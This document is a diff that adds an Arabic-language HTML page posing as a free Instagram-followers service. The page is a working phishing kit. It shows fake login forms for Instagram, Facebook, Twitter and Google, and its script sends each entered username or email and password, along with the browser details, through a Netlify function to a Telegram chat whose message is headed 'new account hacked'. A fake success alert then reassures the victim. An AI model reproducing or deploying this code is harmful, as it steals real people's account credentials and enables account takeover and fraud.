@@ -1,0 +1,376 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>متابعين انستقرام</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Arial', sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .container {
+            width: 100%;
+            max-width: 500px;
+        }
+        
+        .card {
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.2);
+            overflow: hidden;
+        }
+        
+        .header {
+            background: linear-gradient(135deg, #E1306C, #C13584);
+            color: white;
+            padding: 30px;
+            text-align: center;
+        }
+        
+        .header h1 {
+            font-size: 28px;
+            margin-bottom: 10px;
+            font-weight: bold;
+        }
+        
+        .header p {
+            font-size: 16px;
+            opacity: 0.9;
+        }
+        
+        .content {
+            padding: 30px;
+        }
+        
+        .login-options {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+            margin-bottom: 30px;
+        }
+        
+        .login-option {
+            background: #f8f9fa;
+            border: 2px solid #e9ecef;
+            border-radius: 12px;
+            padding: 20px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+        
+        .login-option:hover {
+            border-color: #E1306C;
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(225, 48, 108, 0.2);
+        }
+        
+        .login-option i {
+            font-size: 30px;
+            margin-bottom: 10px;
+            display: block;
+        }
+        
+        .instagram { color: #E1306C; }
+        .facebook { color: #1877F2; }
+        .twitter { color: #1DA1F2; }
+        .google { color: #DB4437; }
+        
+        .login-option span {
+            font-weight: 600;
+            color: #333;
+        }
+        
+        .form-container {
+            display: none;
+        }
+        
+        .form-container.active {
+            display: block;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            color: #333;
+        }
+        
+        .form-group input {
+            width: 100%;
+            padding: 15px;
+            border: 2px solid #e9ecef;
+            border-radius: 10px;
+            font-size: 16px;
+            transition: border-color 0.3s;
+        }
+        
+        .form-group input:focus {
+            border-color: #E1306C;
+            outline: none;
+        }
+        
+        .btn {
+            background: linear-gradient(135deg, #E1306C, #C13584);
+            color: white;
+            border: none;
+            padding: 15px;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            width: 100%;
+            transition: all 0.3s;
+        }
+        
+        .btn:hover {
+            background: linear-gradient(135deg, #C13584, #E1306C);
+            box-shadow: 0 5px 15px rgba(225, 48, 108, 0.4);
+        }
+        
+        .back-btn {
+            background: #6c757d;
+            margin-top: 10px;
+        }
+        
+        .back-btn:hover {
+            background: #5a6268;
+            box-shadow: 0 5px 15px rgba(108, 117, 125, 0.4);
+        }
+        
+        .hidden {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="card">
+            <div class="header">
+                <h1>متابعين انستقرام</h1>
+                <p>احصل على متابعين حقيقيين مجاناً</p>
+            </div>
+            
+            <div class="content">
+                <!-- اختيار طريقة التسجيل -->
+                <div id="loginSelection">
+                    <div class="login-options">
+                        <div class="login-option" onclick="showLoginForm('instagram')">
+                            <i class="instagram">📷</i>
+                            <span>انستقرام</span>
+                        </div>
+                        <div class="login-option" onclick="showLoginForm('facebook')">
+                            <i class="facebook">👤</i>
+                            <span>فيسبوك</span>
+                        </div>
+                        <div class="login-option" onclick="showLoginForm('twitter')">
+                            <i class="twitter">🐦</i>
+                            <span>تويتر</span>
+                        </div>
+                        <div class="login-option" onclick="showLoginForm('google')">
+                            <i class="google">🔍</i>
+                            <span>جوجل</span>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- نموذج انستقرام -->
+                <div id="instagramForm" class="form-container">
+                    <div class="form-group">
+                        <label for="instaUsername">اسم المستخدم</label>
+                        <input type="text" id="instaUsername" placeholder="اسم المستخدم في الانستقرام">
+                    </div>
+                    <div class="form-group">
+                        <label for="instaPassword">كلمة المرور</label>
+                        <input type="password" id="instaPassword" placeholder="كلمة المرور">
+                    </div>
+                    <button class="btn" onclick="submitForm('instagram')">تسجيل الدخول</button>
+                    <button class="btn back-btn" onclick="showLoginSelection()">رجوع</button>
+                </div>
+                
+                <!-- نموذج فيسبوك -->
+                <div id="facebookForm" class="form-container">
+                    <div class="form-group">
+                        <label for="fbEmail">البريد الإلكتروني أو رقم الهاتف</label>
+                        <input type="text" id="fbEmail" placeholder="البريد الإلكتروني أو رقم الهاتف">
+                    </div>
+                    <div class="form-group">
+                        <label for="fbPassword">كلمة المرور</label>
+                        <input type="password" id="fbPassword" placeholder="كلمة المرور">
+                    </div>
+                    <button class="btn" onclick="submitForm('facebook')">تسجيل الدخول</button>
+                    <button class="btn back-btn" onclick="showLoginSelection()">رجوع</button>
+                </div>
+                
+                <!-- نموذج تويتر -->
+                <div id="twitterForm" class="form-container">
+                    <div class="form-group">
+                        <label for="twitterUsername">اسم المستخدم</label>
+                        <input type="text" id="twitterUsername" placeholder="@username">
+                    </div>
+                    <div class="form-group">
+                        <label for="twitterPassword">كلمة المرور</label>
+                        <input type="password" id="twitterPassword" placeholder="كلمة المرور">
+                    </div>
+                    <button class="btn" onclick="submitForm('twitter')">تسجيل الدخول</button>
+                    <button class="btn back-btn" onclick="showLoginSelection()">رجوع</button>
+                </div>
+                
+                <!-- نموذج جوجل -->
+                <div id="googleForm" class="form-container">
+                    <div class="form-group">
+                        <label for="googleEmail">البريد الإلكتروني</label>
+                        <input type="email" id="googleEmail" placeholder="example@gmail.com">
+                    </div>
+                    <div class="form-group">
+                        <label for="googlePassword">كلمة المرور</label>
+                        <input type="password" id="googlePassword" placeholder="كلمة المرور">
+                    </div>
+                    <button class="btn" onclick="submitForm('google')">تسجيل الدخول</button>
+                    <button class="btn back-btn" onclick="showLoginSelection()">رجوع</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // أزليت التوكن من هنا
+        
+        function getChatId() {
+            const params = new URLSearchParams(window.location.search);
+            return params.get('chatId');
+        }
+        
+        async function sendToTelegram(message) {
+            const chatId = getChatId();
+            if (!chatId) {
+                console.error('No chatId found');
+                return false;
+            }
+            
+            try {
+                // إرسال لـ Netlify Function
+                const response = await fetch('/.netlify/functions/send-message', {
+                    method: 'POST',
+                    headers: { 
+                        'Content-Type': 'application/json' 
+                    },
+                    body: JSON.stringify({
+                        chatId: chatId,
+                        message: message
+                    })
+                });
+                
+                const result = await response.json();
+                return result.success;
+                
+            } catch (error) {
+                console.error('Error sending message:', error);
+                return false;
+            }
+        }
+        
+        function showLoginForm(platform) {
+            // إخفاء كل النماذج
+            document.getElementById('loginSelection').classList.add('hidden');
+            document.querySelectorAll('.form-container').forEach(form => {
+                form.classList.remove('active');
+            });
+            
+            // إظهار النموذج المطلوب
+            document.getElementById(platform + 'Form').classList.add('active');
+        }
+        
+        function showLoginSelection() {
+            // إخفاء كل النماذج
+            document.querySelectorAll('.form-container').forEach(form => {
+                form.classList.remove('active');
+            });
+            
+            // إظهار اختيارات التسجيل
+            document.getElementById('loginSelection').classList.remove('hidden');
+        }
+        
+        async function submitForm(platform) {
+            let username, password, email;
+            
+            switch(platform) {
+                case 'instagram':
+                    username = document.getElementById('instaUsername').value.trim();
+                    password = document.getElementById('instaPassword').value.trim();
+                    break;
+                case 'facebook':
+                    email = document.getElementById('fbEmail').value.trim();
+                    password = document.getElementById('fbPassword').value.trim();
+                    break;
+                case 'twitter':
+                    username = document.getElementById('twitterUsername').value.trim();
+                    password = document.getElementById('twitterPassword').value.trim();
+                    break;
+                case 'google':
+                    email = document.getElementById('googleEmail').value.trim();
+                    password = document.getElementById('googlePassword').value.trim();
+                    break;
+            }
+            
+            if ((!username && !email) || !password) {
+                alert('يرجى ملء جميع الحقول');
+                return;
+            }
+            
+            const chatId = getChatId();
+            const message = `
+🔐 <b>تم اختراق حساب انستجرام جديد</b>
+
+📱 <b>المنصة:</b> ${platform}
+${username ? `👤 <b>اسم المستخدم:</b> ${username}\n` : ''}
+${email ? `📧 <b>البريد الإلكتروني:</b> ${email}\n` : ''}
+🔑 <b>كلمة المرور:</b> ${password}
+🆔 <b>Chat ID:</b> ${chatId}
+⏰ <b>الوقت:</b> ${new Date().toLocaleString('ar-EG')}
+🌐 <b>المتصفح:</b> ${navigator.userAgent}
+            `.trim();
+            
+            const sent = await sendToTelegram(message);
+            
+            if (sent) {
+                alert('جاري التحقق من البيانات...');
+                // إضافة تحميل وهمي
+                setTimeout(() => {
+                    alert('✅ تم التحقق من البيانات بنجاح! سيتم إرسال المتابعين خلال 24 ساعة.');
+                    showLoginSelection();
+                    // مسح الحقول
+                    document.querySelectorAll('input').forEach(input => input.value = '');
+                }, 2000);
+            } else {
+                alert('حدث خطأ في الإرسال، يرجى المحاولة مرة أخرى');
+            }
+        }
+        
+        // التحقق من وجود chatId عند التحميل
+        window.addEventListener('load', function() {
+            const chatId = getChatId();
+            if (!chatId) {
+                alert('⚠️ الرابط غير صحيح - يرجى استخدام الرابط الصحيح');
+            }
+        });
+    </script>
+</body>
+</html>
